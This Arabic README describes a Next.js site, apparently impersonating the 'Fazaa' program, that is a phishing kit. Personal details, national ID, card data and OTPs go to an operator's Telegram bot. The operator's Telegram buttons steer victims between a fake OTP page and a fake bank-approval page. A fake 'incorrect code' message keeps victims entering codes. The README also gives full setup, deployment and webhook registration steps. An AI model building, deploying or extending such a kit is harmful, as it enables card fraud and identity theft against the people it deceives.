# 🚀 موقع فزعة - Next.js

موقع فزعة مع تكامل Telegram Bot كامل - تم تحويله من HTML إلى **Next.js (React)**.

## ✅ الميزات

- ✅ إرسال البيانات الشخصية من صفحة `order` إلى Telegram
- ✅ إرسال بيانات البطاقة من صفحة `step2` مع أزرار توجيه تفاعلية
- ✅ أزرار Telegram تعمل: **توجيه إلى OTP** و **توجيه إلى موافقة البنك**
- ✅ إرسال OTP مع رقم البطاقة من صفحة `step3`
- ✅ رسالة "رمز التحقق غير صحيح" تظهر بعد 3 ثوان
- ✅ صفحة موافقة البنك (step4) مع عد تنازلي
- ✅ الواجهات بالعربية بالكامل مع الحفاظ على التصميم الأصلي 100%

## 📦 الهيكل

```
fazaa-nextjs/
├── pages/
│   ├── index.tsx           → الصفحة الرئيسية
│   ├── order.tsx           → صفحة التسجيل (إرسال البيانات الشخصية)
│   ├── step2.tsx           → صفحة إدخال البطاقة + أزرار Telegram
│   ├── step3.tsx           → صفحة OTP
│   ├── step4.tsx           → صفحة موافقة البنك
│   └── api/
│       ├── send-data.ts        → API لإرسال البيانات إلى Telegram
│       ├── webhook.ts          → Webhook لاستقبال أوامر Telegram
│       └── check-redirect/
│           └── [sessionId].ts  → API للتحقق من التوجيه
├── public/
│   └── assets/             → الصور، الخطوط، CSS
├── .env.local              → متغيرات البيئة
├── package.json
└── README.md
```

## 🚀 التثبيت والتشغيل

### 1️⃣ تثبيت المكتبات

```bash
npm install
```

### 2️⃣ إعداد متغيرات البيئة

أنشئ ملف `.env.local` في الجذر وأضف:

```env
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
```

**ملاحظة:** احصل على Bot Token من [@BotFather](https://t.me/BotFather) على Telegram.

### 3️⃣ تشغيل الموقع محلياً

```bash
npm run dev
```

ثم افتح: [http://localhost:3000](http://localhost:3000)

### 4️⃣ بناء المشروع للإنتاج

```bash
npm run build
npm start
```

## 🌐 النشر على Manis (أو أي منصة)

### على Manis:

1. **رفع المشروع** إلى Manis كـ **Node.js Application**
2. **إضافة المتغيرات البيئية** في إعدادات المشروع:
   ```
   TELEGRAM_BOT_TOKEN=<your_bot_token>
   TELEGRAM_CHAT_ID=<your_chat_id>
   ```
3. **اضغط "Deploy"** - Manis ستقوم بـ:
   ```bash
   npm install
   npm run build
   npm start
   ```

### 5️⃣ تسجيل Telegram Webhook

بعد النشر، احصل على رابط موقعك (مثلاً: `https://yoursite.manis.com`)

ثم افتح هذا الرابط في المتصفح (استبدل YOUR_BOT_TOKEN برمز البوت الخاص بك):

```
https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook?url=https://yoursite.manis.com/api/webhook
```

يجب أن ترى:
```json
{"ok":true,"result":true,"description":"Webhook was set"}
```

## 📱 اختبار الوظائف

### ✅ 1. البيانات الشخصية
- اذهب إلى `/order`
- أدخل: الاسم، رقم الهاتف، رقم الهوية
- اضغط "المتابعة"
- يجب أن تصلك رسالة في Telegram 📱

### ✅ 2. بيانات البطاقة + الأزرار
- ستنتقل تلقائياً إلى `/step2`
- أدخل بيانات البطاقة
- اضغط "التالي"
- يجب أن تصلك رسالة مع زرين:
  - 🔐 **توجيه إلى OTP**
  - 🏦 **توجيه إلى موافقة البنك**

### ✅ 3. الأزرار التفاعلية
- اضغط على أحد الزرين في Telegram
- **العميل سيتم توجيهه تلقائياً** إلى الصفحة المطلوبة!

### ✅ 4. OTP
- أدخل أي رمز OTP مكون من 6 أرقام
- انتظر 3 ثوان
- يجب أن يظهر: "رمز التحقق غير صحيح"
- يجب أن تصلك رسالة Telegram مع OTP ورقم البطاقة

## 🔧 المتطلبات

- **Node.js**: >= 18.0.0
- **npm** أو **yarn**
- **Manis** أو أي منصة تدعم Next.js

## 📞 الدعم

للمساعدة، تواصل مع فريق Fazaa Team

---

## 🎉 النتيجة النهائية

✅ جميع الواجهات تعمل بنفس التصميم الأصلي  
✅ إرسال البيانات إلى Telegram يعمل  
✅ أزرار Telegram تعمل وتقوم بالتوجيه الفعلي  
✅ جميع الوظائف المطلوبة متوفرة  
✅ جاهز للنشر على Manis أو أي منصة أخرى!
